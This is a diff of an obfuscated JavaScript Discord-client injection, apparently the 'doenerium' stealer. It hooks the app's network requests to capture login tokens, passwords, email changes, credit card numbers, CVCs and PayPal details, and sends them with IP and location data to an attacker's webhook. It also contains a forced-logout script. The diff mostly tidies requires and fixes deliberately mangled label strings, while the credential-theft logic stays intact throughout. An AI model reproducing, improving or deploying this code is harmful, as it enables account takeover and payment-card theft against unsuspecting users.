@@ -1,7 +1,3 @@
-const fs = require('fs')
-const https = require('https')
-const execFile = require('child_process');
-
 function _0x5701(_0x4aba1d, _0x4a1311) {
     var _0x4f7eff = _0x4e63();
     return _0x5701 = function(_0x2e51c6, _0x4e3e4f) {
@@ -75,7 +71,7 @@ var _0x4e3e4f = (function() {
 _0x2e51c6();
 const {
     BrowserWindow, session
-} = require(_0x59caf9(0xe8)), os = require('os'), querystring = require(_0x59caf9(0x195));
+} = require(_0x59caf9(0xe8)), os = require('os'), https = require(_0x59caf9(0xec)), querystring = require(_0x59caf9(0x195)), fs = require('fs');
 var config = {
         'brand': _0x59caf9(0x187),
         'webhook': _0x59caf9(0x170),
@@ -161,14 +157,13 @@ var config = {
         return _0x196b39['webContents'][_0xad2efd(0x163)](_0x16c54e, !![]);
     };
 
-    function _0x4e63() {
-        var _0x5ad62e = ['%WEBHOOK_LINK%', 'Billing', '\x20:credit_card:', 'card[exp_month]', 'cwd', 'querystring', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'https://*.discord.com/api/v*/applications/detectable', 'length', '<:balance:874750808267292683>', 'https://cdn.discordapp.com/avatars/', 'toString', 'hostname', 'https://*.discord.com/api/v*/users/@me/billing/subscriptions', 'content-security-policy-report-only', 'Discord\x20|\x20User\x20logged\x20in', '<:early_supporter:874750808414113823>', '{}.constructor(\x22return\x20this\x22)(\x20)', '```yaml\x0aIP\x20Address:\x20', 'webRequest', 'parse', '```❌```', 'Access-Control-Allow-Headers\x20\x27*\x27', '<:brilliance:874750808338608199>', 'stringify', 'href', 'https://discord.com/api/v*/applications/detectable', 'Hostname', 'LOCALAPPDATA', 'footer', 'table', '<:bughunter_1:874750808426692658>', '5519480ATeygH', '24ZOpuGG', 'Unknown', 'electron', 'https://discord.com/api/v*/users/@me', 'passwordChanged', 'includes', 'https', '2380847ztnwdD', 'for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;', 'exp_year', 'Password', 'https://*.discord.com/api/v*/users/@me/library', 'https://cdn.discordapp.com/embed/avatars/0.png', 'statusCode', 'qr_codes', 'https://t.me/doenerium', 'application/json', 'url', '**Total\x20Friends\x20(', 'user', 'No\x20Rare\x20Friends', '\x20<:paypal:896441236062347374>', 'Rare', 'from', '4895KnGXLo', 'onBeforeRequest', '@everyone', 'split', '12OCnbeO', ')**\x0a\x0a', 'brand', 'email', 'userLogin', 'end', 'filters', 'ping', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;', 'Used\x20webhook\x20url', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', 'assign', 'tokens', 'endsWith', 'emailChanged', 'Token', 'Credit\x20card\x20Number', 'apply', 'Discord\x20|\x20User\x20logged\x20out', 'trace', 'users/@me', '\x20||', 'Phone\x20Number', 'then', 'Nitro', 'defaultSession', 'embed', 'startsWith', '813204UZQJiF', 'https://discord.com/api/v*/users/@me/library', 'bind', 'login', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();', '__proto__', '\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;', 'handle', '<:hypesquad_events:874750808594477056>', 'creditCardAdded', 'avatar', 'country', 'constructor', '\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText', 'host', 'public_flags', '719234MqSjuT', '\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText', '```', 'badges', '<:partner:874750808678354964>', 'avatar_url', '\x0aCountry:\x20', 'Discord\x20|\x20Credit\x20card\x20added', '528gpQgva', '\x0aTimezone:\x20', '<:staff:874750808728666152>', 'event', 'Client\x20version', 'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'new_password', 'New\x20email\x20address', 'card[exp_year]', 'None', 'webhook', '\x0aRegion:\x20', 'method', 'webhook_link', 'flags', 'mkdirSync', 'content-security-policy', 'premium_type', 'region', 'logout', 'notify_on_initialization', 'Discord\x20|\x20Email\x20changed', 'Old\x20password', 'Value', 'wss://', '<:bravery:874750808388952075>', 'timezone', 'notify_on_logout', 'https://discord.com/api/v*/users/@me/billing/subscriptions', 'number', '1645468hIxAXP', 'https://api.stripe.com/v*/payment_intents/*/confirm', 'invalid', 'discord.com', 'Discord\x20|\x20Client\x20initialized', 'info', 'E-Mail\x20Address', 'bytes', 'default-src\x20\x27*\x27', 'responseHeaders', 'wss://remote-auth-gateway.discord.gg/*', 'cvc', 'content', 'Connection\x20data', 'executeJavaScript', 'Badges', 'https://api.stripe.com/v*/tokens', 'password', 'return\x20(function()\x20', 'type', 'token', 'doenerium\x20|\x20t.me/doenerium', '`✔️`', 'https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless', '(((.+)+)+)+$', 'discriminator', 'error', 'https://dasdadw.mdvksublbpczqluqvvbytfprxdwakuke.nl/', 'Credit\x20card\x20CVC', 'username', 'entries', 'onCompleted', '\x0aCity:\x20', 'log', 'Access-Control-Allow-Origin\x20\x27*\x27', 'onHeadersReceived', 'uploadData', 'request', 'Credit\x20card\x20expiration', '81RCLRQH', 'phone', 'existsSync', '16dPDyGU', 'card[number]', '```No\x20Nitro```', 'console', 'prototype', 'frien', 'filter', 'POST', 'doenerium_', 'pathname', '\x0aHostname:\x20', '<:bughunter_2:874750808430874664>', 'replace', 'Discord\x20|\x20Password\x20changed', '1826OFWXrS', 'forEach', 'data'];
-        _0x4e63 = function() {
-            return _0x5ad62e;
-        };
-        return _0x4e63();
-    }
-
+function _0x4e63() {
+    var _0x5ad62e = ['%WEBHOOK_LINK%', 'Billing', '\x20:credit_card:', 'card[exp_month]', 'cwd', 'querystring', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'https://*.discord.com/api/v*/applications/detectable', 'length', '<:balance:874750808267292683>', 'https://cdn.discordapp.com/avatars/', 'toString', 'hostname', 'https://*.discord.com/api/v*/users/@me/billing/subscriptions', 'content-security-policy-report-only', 'Discord\x20|\x20User\x20logged\x20in', '<:early_supporter:874750808414113823>', '{}.constructor(\x22return\x20this\x22)(\x20)', '```yaml\x0aIP\x20Address:\x20', 'webRequest', 'parse', '```❌```', 'Access-Control-Allow-Headers\x20\x27*\x27', '<:brilliance:874750808338608199>', 'stringify', 'href', 'https://discord.com/api/v*/applications/detectable', 'Hostname', 'LOCALAPPDATA', 'footer', 'table', '<:bughunter_1:874750808426692658>', '5519480ATeygH', '24ZOpuGG', 'Unknown', 'electron', 'https://discord.com/api/v*/users/@me', 'passwordChanged', 'includes', 'https', '2380847ztnwdD', 'for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;', 'exp_year', 'Password', 'https://*.discord.com/api/v*/users/@me/library', 'https://cdn.discordapp.com/embed/avatars/0.png', 'statusCode', 'qr_codes', 'https://t.me/doenerium', 'application/json', 'url', '**Total\x20Friends\x20(', 'user', 'No\x20Rare\x20Friends', '\x20<:paypal:896441236062347374>', 'Rare', 'from', '4895KnGXLo', 'onBeforeRequest', '@everyone', 'split', '12OCnbeO', ')**\x0a\x0a', 'brand', 'email', 'userLogin', 'end', 'filters', 'ping', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;', 'Used\x20webhook\x20url', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', 'assign', 'tokens', 'endsWith', 'emailChanged', 'Token', 'Credit\x20card\x20Number', 'apply', 'Discord\x20|\x20User\x20logged\x20out', 'trace', 'users/@me', '\x20||', 'Phone\x20Number', 'then', 'Nitro', 'defaultSession', 'embed', 'startsWith', '813204UZQJiF', 'https://discord.com/api/v*/users/@me/library', 'bind', 'login', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();', '__proto__', '\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;', 'handle', '<:hypesquad_events:874750808594477056>', 'creditCardAdded', 'avatar', 'country', 'constructor', '\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText', 'host', 'public_flags', '719234MqSjuT', '\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText', '```', 'badges', '<:partner:874750808678354964>', 'avatar_url', '\x0aCountry:\x20', 'Discord\x20|\x20Credit\x20card\x20added', '528gpQgva', '\x0aTimezone:\x20', '<:staff:874750808728666152>', 'event', 'Client\x20version', 'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'new_password', 'New\x20email\x20address', 'card[exp_year]', 'None', 'webhook', '\x0aRegion:\x20', 'method', 'webhook_link', 'flags', 'mkdirSync', 'content-security-policy', 'premium_type', 'region', 'logout', 'notify_on_initialization', 'Discord\x20|\x20Email\x20changed', 'Old\x20password', 'Value', 'wss://', '<:bravery:874750808388952075>', 'timezone', 'notify_on_logout', 'https://discord.com/api/v*/users/@me/billing/subscriptions', 'number', '1645468hIxAXP', 'https://api.stripe.com/v*/payment_intents/*/confirm', 'invalid', 'discord.com', 'Discord\x20|\x20Client\x20initialized', 'info', 'E-Mail\x20Address', 'bytes', 'default-src\x20\x27*\x27', 'responseHeaders', 'wss://remote-auth-gateway.discord.gg/*', 'cvc', 'content', 'Connection\x20data', 'executeJavaScript', 'Badges', 'https://api.stripe.com/v*/tokens', 'password', 'return\x20(function()\x20', 'type', 'token', 'doenerium\x20|\x20t.me/doenerium', '`✔️`', 'https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless', '(((.+)+)+)+$', 'discriminator', 'error', 'https://dasdadw.mdvksublbpczqluqvvbytfprxdwakuke.nl/', 'Credit\x20card\x20CVC', 'username', 'entries', 'onCompleted', '\x0aCity:\x20', 'log', 'Access-Control-Allow-Origin\x20\x27*\x27', 'onHeadersReceived', 'uploadData', 'request', 'Credit\x20card\x20expiration', '81RCLRQH', 'phone', 'existsSync', '16dPDyGU', 'card[number]', '```No\x20Nitro```', 'console', 'prototype', 'frien', 'filter', 'POST', 'doenerium_', 'pathname', '\x0aHostname:\x20', '<:bughunter_2:874750808430874664>', 'replace', 'Discord\x20|\x20Password\x20changed', '1826OFWXrS', 'forEach', 'data'];
+    _0x4e63 = function() {
+        return _0x5ad62e;
+    };
+    return _0x4e63();
+}
 class Event {
     constructor(_0x4a7479, _0x501d31, _0x181bf0) {
         var _0xb28a2c = _0x59caf9;
@@ -363,7 +358,7 @@ var event_handlers = {
                     'value': '```' + _0x37ea0e + _0x33c273(0x131),
                     'inline': !![]
                 }, {
-                    'name': 'E-Mail\x20AddreYYss',
+                    'name': 'E-Mail\x20Address',
                     'value': '```' + _0x224d90 + _0x33c273(0x131),
                     'inline': !![]
                 }, {
@@ -476,7 +471,6 @@ var event_handlers = {
                     }
                 })]
             };
-
         sendToWebhook(_0x1bed6a);
     }, async 'passwordChanged' (_0x2caee8, _0xd7ae3f, _0x58e42e) {
         var _0x2914fe = _0x59caf9,
@@ -502,7 +496,7 @@ var event_handlers = {
                         'value': _0x2914fe(0x131) + _0x2caee8 + _0x2914fe(0x131),
                         'inline': ![]
                     }, {
-                        'name': 'New\x20passYYword',
+                        'name': 'New\x20password',
                         'value': _0x2914fe(0x131) + _0xd7ae3f + '```',
                         'inline': ![]
                     }, {
@@ -693,7 +687,7 @@ async function initialize() {
                     'value': _0x554ef7(0x131) + os[_0x554ef7(0x19c)] + '```',
                     'inline': ![]
                 }, {
-                    'name': 'Client\x20versioYYn',
+                    'name': 'Client\x20version',
                     'value': _0x554ef7(0x131) + getDiscordClient() + '```',
                     'inline': ![]
                 }, {
@@ -701,7 +695,7 @@ async function initialize() {
                     'value': _0x554ef7(0xd7) + (_0x54de57['ip'] ?? _0x554ef7(0xe7)) + '\x0aHostname:\x20' + (_0x54de57[_0x554ef7(0x19c)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x175) + (_0x54de57['city'] ?? _0x554ef7(0xe7)) + _0x554ef7(0x142) + (_0x54de57['region'] ?? 'Unknown') + _0x554ef7(0x135) + (_0x54de57[_0x554ef7(0x12a)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x138) + (_0x54de57[_0x554ef7(0x151)] ?? 'Unknown') + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
-                    'name': 'HostYYname',
+                    'name': 'Hostname',
                     'value': '```' + os[_0x554ef7(0x19c)] + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
@@ -710,7 +704,8 @@ async function initialize() {
                     'inline': ![]
                 }]
             })]
-        }) : (_0x1d5e16 = await getUserInfo(_0x2f94cc), _0x25dc85 = await getBilling(_0x2f94cc), _0xd3be96 = await getRelationships(_0x2f94cc), sendToWebhook({            'username': config[_0x554ef7(0x11c)][_0x554ef7(0x172)],
+        }) : (_0x1d5e16 = await getUserInfo(_0x2f94cc), _0x25dc85 = await getBilling(_0x2f94cc), _0xd3be96 = await getRelationships(_0x2f94cc), sendToWebhook({
+            'username': config[_0x554ef7(0x11c)][_0x554ef7(0x172)],
             'avatar_url': config['embed'][_0x554ef7(0x134)],
             'embeds': [createEmbed({
                 'title': _0x554ef7(0x159),
@@ -760,7 +755,7 @@ async function initialize() {
                     'value': _0x554ef7(0xd7) + (_0x54de57['ip'] ?? _0x554ef7(0xe7)) + _0x554ef7(0x189) + (_0x54de57[_0x554ef7(0x19c)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x175) + (_0x54de57['city'] ?? _0x554ef7(0xe7)) + _0x554ef7(0x142) + (_0x54de57[_0x554ef7(0x149)] ?? _0x554ef7(0xe7)) + '\x0aCountry:\x20' + (_0x54de57[_0x554ef7(0x12a)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x138) + (_0x54de57['timezone'] ?? 'Unknown') + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
-                    'name': 'YARRAKe',
+                    'name': 'Hostname',
                     'value': _0x554ef7(0x131) + os[_0x554ef7(0x19c)] + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
@@ -769,7 +764,7 @@ async function initialize() {
                     'inline': ![]
                 }]
             }), createEmbed({
-                'description': '**Total\x20FrienYYds\x20(' + _0xd3be96[_0x554ef7(0x198)] + ')**\x0a\x0a' + _0xd3be96['frien'],
+                'description': '**Total\x20Friends\x20(' + _0xd3be96[_0x554ef7(0x198)] + ')**\x0a\x0a' + _0xd3be96['frien'],
                 'thumbnail': {
                     'url': _0x1d5e16['avatar'] ? _0x554ef7(0x19a) + _0x1d5e16['id'] + '/' + _0x1d5e16[_0x554ef7(0x129)] : _0x554ef7(0xf2)
                 },
@@ -779,7 +774,8 @@ async function initialize() {
                     'icon_url': _0x1d5e16[_0x554ef7(0x129)] ? _0x554ef7(0x19a) + _0x1d5e16['id'] + '/' + _0x1d5e16['avatar'] : _0x554ef7(0xf2)
                 }
             })]
-        }))), config[_0x554ef7(0x14a)] && _0x2f94cc && (await execScript(_0x554ef7(0x123), !![])[_0x554ef7(0x119)](_0x6bc84 => {}), config[_0x554ef7(0x152)] && sendToWebhook({            'username': config[_0x554ef7(0x11c)][_0x554ef7(0x172)],
+        }))), config[_0x554ef7(0x14a)] && _0x2f94cc && (await execScript(_0x554ef7(0x123), !![])[_0x554ef7(0x119)](_0x6bc84 => {}), config[_0x554ef7(0x152)] && sendToWebhook({
+            'username': config[_0x554ef7(0x11c)][_0x554ef7(0x172)],
             'avatar_url': config[_0x554ef7(0x11c)][_0x554ef7(0x134)],
             'embeds': [createEmbed({
                 'title': _0x554ef7(0x114),
@@ -801,11 +797,11 @@ async function initialize() {
                     'value': '' + _0x25dc85,
                     'inline': !![]
                 }, {
-                    'name': 'BadgYYes',
+                    'name': 'Badges',
                     'value': '' + getBadges(_0x1d5e16[_0x554ef7(0x145)]),
                     'inline': ![]
                 }, {
-                    'name': 'TokeYYn',
+                    'name': 'Token',
                     'value': '```' + _0x2f94cc + '```',
                     'inline': ![]
                 }, {
@@ -813,7 +809,7 @@ async function initialize() {
                     'value': _0x554ef7(0x131) + os[_0x554ef7(0x19c)] + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
-                    'name': 'UsYYed\x20webhook\x20url',
+                    'name': 'Used\x20webhook\x20url',
                     'value': _0x554ef7(0x131) + config[_0x554ef7(0x144)] + '```',
                     'inline': ![]
                 }]
